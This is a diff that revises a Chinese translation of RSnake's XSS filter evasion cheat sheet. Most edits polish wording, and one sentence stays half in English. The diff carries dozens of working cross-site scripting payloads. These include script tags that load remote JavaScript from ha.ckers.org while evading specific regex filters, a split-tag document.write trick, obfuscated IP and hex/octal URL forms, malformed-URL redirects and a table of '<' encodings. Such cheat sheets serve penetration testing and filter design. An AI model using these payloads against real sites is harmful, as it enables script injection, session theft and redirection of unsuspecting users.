@@ -653,36 +653,36 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
 
 -----
 ##使用HTML 引用封装的xss##
-他是被测试在ie，具体因情况而异。它是为了绕过那些可以输入 "&lt;SCRIPT>" 但不允许输入 "&lt;SCRIPT SRC..."，通过正则"/&lt;script[^>]+src/i"进行过滤的xss过滤区。
+它是被测试在ie，具体因情况而异。这个向量是为了绕过那些可以输入 "&lt;SCRIPT>" 但不允许输入 "&lt;SCRIPT SRC..."，通过正则"/&lt;script[^>]+src/i"进行过滤的xss过滤器。
 
     <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js">
 
-为了执行xss代码在那些允许输入"&lt;SCRIPT>" 但不允许 "&lt;script src..."靠正则拼配"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"   （这个是重要的，因为我已经看到这个正则在实际环境中。）   
+为了执行xss代码在那些允许输入"&lt;SCRIPT>" 但不允许 "&lt;script src..."（通过正则拼配"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"来过滤）   这个是重要的，因为我已经看到这个正则在实际环境中被使用。  
 
     <SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-另一个逃避相同正则 "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"的xss代码
+另一个逃避相同正则 "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"过滤的xss代码
 
     <SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
     
-这是另一个xss例子去绕过相同的过滤器，关于"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"的正则过滤。我知道，我说过我将不会去痛痛快快的聊减灾技术。但是这是我所看到的唯一例子在允许用户输入&lt;SCRIPT>但是不允许通过src加在远程脚本的过滤这个xss的可用方法。（当然，还有一些其他方法去处理它，如果它们允许&lt;SCRIPT> ）
+再一个xss例子去绕过相同的过滤器，对于"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"的正则过滤。我知道，我说过我将不会去痛痛快快的聊减灾技术。但是这是我所看到的唯一例子在允许用户输入&lt;SCRIPT>但是不允许通过src加载远程脚本的过滤器。（当然，还有一些其他方法去处理它，如果它们允许&lt;SCRIPT> ）
 
     <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-最后一个绕过"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"正则匹配的例子，通过重音符。（再以无法工作在firfox）
+最后一个绕过"/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i"正则匹配的例子，通过重音符。（无法工作在firfox）
 
     <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-这个xss例子押注域哪些正则并不去拼配一对引号，而是去发现任何引号后就立即结束参数字符串。
+这个xss例子押注于那些并不去拼配一对引号，而是去发现任何引号后就立即结束一个参数字符串的正则过滤器。
 
     <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
-这xss仍然让我担心，因为他是几乎没有肯呢过去停止在没有阻止活动内容的情况下。
+这xss仍然让我担心， as it would be nearly impossible to stop this without blocking all active content:
 
     <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
 ##URL 字符串绕过##
-这里假设 "http://www.google.com/" 这种在语法上是不被允许的。
+这里假设 "http://www.google.com/" 这种形式的url在语法上是不被过滤器允许的。
 
 **IP代替域名**
 
@@ -693,12 +693,12 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
     <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
 
 **双字节编码**
-（注意：有其他的双字节编码变种。请参考下面混淆后的ip为更多信息）
+（注意：有其他的双字节编码变种。请参考下面混淆后的ip地址为更多信息）
 
     <A HREF="http://1113982867/">XSS</A>
 
 **十六进制编码**
-The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit,因为十六进制数实在0-f之间，因此第三位开头的0可以被省略掉。
+The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit,因为十六进制数字在0-f之间，因此第三位开头的0可以被省略掉。
 
     <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
 
@@ -708,28 +708,28 @@ Again padding is allowed, although you must keep it above 4 total characters per
     <A HREF="http://0102.0146.0007.00000223/">XSS</A>
 
 **混合编码**
-让我们混合基本编码并且插入一个tab和换行符。为什么浏览器允许这样，我是不知道。但是它是可以工作当它们被包含在引号之间。
+让我们混合基本各种编码并且插入一个tab和换行符。为什么浏览器允许这样，我是不知道。但是它是可以工作当它们被包含在引号之间。
 
     <A HREF="h
     tt	p://6	6.000146.0x7.147/">XSS</A>
 
 **协议绕过**
-“//”代替“http:// ” 可以节省更多字符。这是非常有用的当输入空间是有限的时候。两个字符可能解决大问题。也是容易绕过像"(ht|f)tp(s)?://" 这样的正则过滤。（感谢 Ozh 提出这部分）。你也可以改变//" 为 "\\"。你需要保持斜杠在适当的地方。否则可能会被当作一个相对路径的url。
+“//”代替“http:// ” 可以节省更多字符。这是非常有用的当输入空间是有限的时候。节省两个字符可能解决大问题。也是容易绕过像"(ht|f)tp(s)?://" 这样的正则过滤。（感谢 Ozh 提出这部分）。你也可以改变"//" 为 "\\"。你需要保证斜杠在适当的地方。否则可能会被当作一个相对路径的url。
 
     <A HREF="//www.google.com/">XSS</A>
 
 **Google "feeling lucky" I**
-Firefox 使用 Google的"feeling lucky" 函数去重定向用户输入的任何关键字。因此你可以在可利用页面使用任何关键字针对任何Firefox用户。它是使用了"keyword:" 协议。你可以使用多个关键字像下面的例子：XSS+RSnake。它是无法使用在 Firefox as of 2.0。
+Firefox 使用 Google的"feeling lucky" 函数去重定向用户输入的任何关键字。因此你可以在可利用页面使用各种关键字针对任何Firefox用户进行攻击。它是使用了"keyword:" 协议。你可以使用多个关键字像这样：XSS+RSnake。它是无法使用在 Firefox as of 2.0。
 
     <A HREF="//google">XSS</A>
 
 **Google "feeling lucky" II**
-这是使用一个小技巧让他工作在Firefox，因为只有它实现了 "feeling lucky" 函数。不像下一个例子，它是无法工作在 Opera ，由于 Opera认为它是一种老的钓鱼攻击。它是一个简单的畸形url。如果你点击弹出框的确定按钮它将工作。但是由于这是一个错误对话框，我是说Opera是不支持它。它也不再被支持在 Firefox 2.0。
+这是使用一个小技巧让他工作在Firefox，因为只有Firefox实现了 "feeling lucky" 函数。不像下一个例子，这是无法工作在 Opera ，由于 Opera认为它是一种老的钓鱼攻击。其实它只是一个简单的畸形url。如果你点击弹出框的确定按钮它将工作。但是由于这是一个错误对话框，其实我想说Opera是不支持这种形式的。另外它已经不再被支持在 Firefox 2.0。
 
     <A HREF="http://ha.ckers.org@google">XSS</A>
 
 **Google "feeling lucky" III**
-它是通过畸形url来工作在Firefox 和 Opera浏览器。因为只有他们实现了 "feeling lucky" 函数。像上面的例子一样，它们需要你的网站在谷歌搜索中排名第一。（例如google）
+通过畸形url来工作在Firefox 和 Opera浏览器。因为只有它们实现了 "feeling lucky" 函数。像上面的例子一样，它们需要你的网站在谷歌搜索对应关键字时排名第一。（例如google）
 
     <A HREF="http://google:ha.ckers.org">XSS</A>
 
@@ -747,13 +747,13 @@ Firefox 使用 Google的"feeling lucky" 函数去重定向用户输入的任何�
     <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
 
 **针对内容替换的攻击向量**
-假设 "http://www.google.com/" 会被替换为空。我确实使用了一个简单的攻击向量去针对特殊文字过滤依靠过滤器本身。这是一个例子去帮助创建向量。（IE: "java&#x09;script:" 被替换为"java	script:", 它是仍可以工作在 IE,使用安全模块的 Netscape 8.1+ 和 Opera）
+这里假设 "http://www.google.com/" 这种链接会被替换为空。我确实有一个去针对特殊文字过滤的简单的攻击向量。这是一个例子去帮助创建向量。（IE: "java&#x09;script:" 被替换为"java	script:", 它是仍可以工作在 IE和使用安全模块的 Netscape 8.1+ 和 Opera）
 
     <A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
 
 -----
 ##字符编码表##
-再付 "<" 在html或是javascript中所有可能的编码形式。它们绝大多数是无法正常渲染的，但是可以在上文中某些情景下得到渲染。
+最后附上 "<" 在html或是javascript中所有可能的编码形式。它们绝大多数是无法正常被渲染的，但是可以在上文中某些情景下得到渲染。
 
     <
     %3C
@@ -828,7 +828,7 @@ Firefox 使用 Google的"feeling lucky" 函数去重定向用户输入的任何�
 
 -----
 ##字符编码和ip混淆器##
-下面地址中包含了在xss有用的各种基本转换器。
+下面网站中包含了对xss有用的各种基本转换器。
 http://ha.ckers.org/xsscalc.html
 
 ----
@@ -837,7 +837,8 @@ Robert "RSnake" Hansen
 
 ----
 ##翻译##
-老道
+老道( dao#yiye.me )
+
   [1]: http://ha.ckers.org/xsscalc.html
   [2]: http://ha.ckers.org/xsscalc.html
   [3]: http://ha.ckers.org/xsscalc.html
